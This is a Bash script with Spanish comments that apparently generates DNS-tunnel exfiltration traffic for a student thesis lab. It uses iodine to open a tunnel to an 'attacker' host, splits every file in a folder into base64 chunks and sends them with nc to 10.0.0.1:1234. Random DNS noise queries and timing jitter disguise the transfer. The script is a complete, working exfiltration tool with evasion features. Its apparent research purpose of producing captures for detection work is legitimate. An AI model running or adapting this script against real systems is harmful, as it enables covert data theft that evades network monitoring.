#!/bin/bash
# Túnel DNS con iodine (cliente)
# Genera tráfico de exfiltración DNS usando iodine.


ATACANTE_IP="192.168.1.142"
DOMINIO="tfg.local"
PASSWORD="tfg2026"
BASE_DIR="/home/user/Documents/TFG"
FICHEROS_DIR="$BASE_DIR/ficheros"
PCAP_DIR="$BASE_DIR/capturas"
TMP_DIR="/tmp/exfil_chunks"
LOG_DIR="$BASE_DIR/logs"
IFACE="eth0"
CHUNK_BYTES=512

if [[ -n "$1" ]]; then
    TIPOS_DNS=("${1^^}")
else
    TIPOS_DNS=("TXT" "NULL" "A")
fi

mkdir -p "$TMP_DIR" "$LOG_DIR" "$PCAP_DIR"

levantar_tunel() {
    local tipo="$1"
    if [[ -n "$IODINE_PID" ]] && kill -0 "$IODINE_PID" 2>/dev/null; then
        kill "$IODINE_PID" 2>/dev/null
        wait "$IODINE_PID" 2>/dev/null
    fi
    ip link set dns0 down 2>/dev/null
    ip link delete dns0 2>/dev/null
    sleep 1
    iodine -f -P "$PASSWORD" -T "$tipo" -O base32 -r -M 120 -m 80 "$ATACANTE_IP" "$DOMINIO" &
    IODINE_PID=$!
    local intentos=0
    while ! ip link show dns0 &>/dev/null; do
        sleep 1
        intentos=$((intentos + 1))
        if (( intentos >= 15 )); then
            echo "Error al inicializar"
            kill $IODINE_PID 2>/dev/null
            IODINE_PID=""
            return 1
        fi
    done
    echo "Túnel $tipo activo"
    return 0
}

cerrar_tunel() {
    if [[ -n "$IODINE_PID" ]]; then
        kill $IODINE_PID 2>/dev/null
        wait $IODINE_PID 2>/dev/null
        IODINE_PID=""
    fi
    ip link set dns0 down 2>/dev/null
    ip link delete dns0 2>/dev/null
    sleep 1
}

ruido_dns() {
    local tipo="$1"
    local rand
    rand=$(tr -dc a-z0-9 </dev/urandom | head -c 6)
    case "$tipo" in
        TXT)  dig +short TXT  "$rand.$DOMINIO" > /dev/null 2>&1 ;;
        NULL) dig +short NULL "$rand.$DOMINIO" > /dev/null 2>&1 ;;
        A)    dig +short A    "$rand.$DOMINIO" > /dev/null 2>&1
              dig +short CNAME "$rand.noise.$DOMINIO" > /dev/null 2>&1 ;;
    esac
}

exfiltrar_fichero() {
    local fichero="$1"
    local tipo="$2"
    local filename
    filename=$(basename "$fichero")
    rm -f "$TMP_DIR/chunk_"*
    split -b "$CHUNK_BYTES" "$fichero" "$TMP_DIR/chunk_"
    local total
    total=$(ls "$TMP_DIR/chunk_"* 2>/dev/null | wc -l)
    (( total == 0 )) && { echo "[!] '$filename' vacío"; return; }
    local i=0
    for chunk in "$TMP_DIR/chunk_"*; do
        i=$((i + 1))
        {
            echo "[[CHUNK $filename $i $total]]"
            base64 "$chunk"
            echo "[[ENDCHUNK]]"
        } | nc -q 1 10.0.0.1 1234
        ruido_dns "$tipo"
        ruido_dns "$tipo"
        sleep $(( RANDOM % 3 + 1 ))
    done
    rm -f "$TMP_DIR/chunk_"*
}

cleanup_global() {
    cerrar_tunel
    rm -f "$TMP_DIR/chunk_"*
    exit 1
}
trap cleanup_global INT TERM

echo "Iniciando exfiltración ${TIPOS_DNS[*]}"

for DNS_TYPE in "${TIPOS_DNS[@]}"; do
    echo "Sesión $DNS_TYPE"
    ficheros=("$FICHEROS_DIR"/*)
    if [[ ! -e "${ficheros[0]}" ]]; then
        echo "[!] Sin ficheros en $FICHEROS_DIR"
        exit 1
    fi
    if ! levantar_tunel "$DNS_TYPE"; then
        echo "Saltando $DNS_TYPE"
        continue
    fi
    for fichero in "$FICHEROS_DIR"/*; do
        [[ -f "$fichero" ]] || continue
        exfiltrar_fichero "$fichero" "$DNS_TYPE"
    done
    {
        echo "[[CHUNK __FIN_SESION__ 1 1]]"
        echo ""
        echo "[[ENDCHUNK]]"
    } | nc -q 1 10.0.0.1 1234
    cerrar_tunel
    echo "Sesión $DNS_TYPE completada"
    [[ "$DNS_TYPE" != "${TIPOS_DNS[-1]}" ]] && sleep 5
done

echo "Éxito"
